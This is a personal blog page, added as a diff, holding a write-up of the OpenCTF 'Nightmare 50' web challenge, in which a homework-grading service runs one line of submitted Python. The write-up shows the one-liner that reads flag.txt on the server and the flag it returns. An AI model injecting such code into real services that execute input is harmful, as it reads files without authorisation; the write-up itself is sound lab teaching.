@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>OpenCTF : Nightmare 50</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>OpenCTF : Nightmare 50</h1>
+			<b><time>19.03.2025 00:00</time></b>
+		       
+
+			<div>
+				<p><strong>Category:</strong> Web</p>
+<p><strong>Points:</strong> 50</p>
+<p><strong>Description:</strong></p>
+<pre tabindex="0"><code>Automated home work scoring my ass. https://shades-of-nightmare.openctf.com/nzpoixyucvkjwnerntasdfascdvasdfqwerqwe/nightmare-50/
+</code></pre><p>When connecting to this website in my browser, I receive the following prompt:</p>
+<pre tabindex="0"><code>Welcome to Doctor Professor Wilson&#39;s Python 101!
+Lesson 1: hello world
+Enter homework for grading:
+</code></pre><p>So it looks like this will execute the Python code you provide. So I test it with the following:</p>
+<pre tabindex="0"><code>Welcome to Doctor Professor Wilson&#39;s Python 101!
+Lesson 1: hello world
+Enter homework for grading:
+print(&#39;Hello world&#39;)
+Hello world
+</code></pre><p>And then it immediately closes the connection. So it looks like it only allows a single line of Python code.</p>
+<p>I then decide to try and dump the working directory file contents. This can be done with <code>os.listdir('.')</code>, however, this would require a call to <code>import os</code>. Unfortunately, it appears some or all imports are blocked, as an error was returned. So instead, I decide to just guess that there exists a file either called <code>flag.txt</code> or <code>flag</code> in the working directory, and luckily, opening and reading files doesn’t require any imports. So I construct a one-liner to do just that: <code>print(open('flag.txt','r').read())</code>.</p>
+<pre tabindex="0"><code>Welcome to Doctor Professor Wilson&#39;s Python 101!
+Lesson 1: hello world
+Enter homework for grading:
+print(open(&#39;flag.txt&#39;,&#39;r&#39;).read())
+ThisIsAVeryFl@ggyFlag
+</code></pre><h1 id="flag">Flag</h1>
+<p><strong>ThisIsAVeryFl@ggyFlag</strong></p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
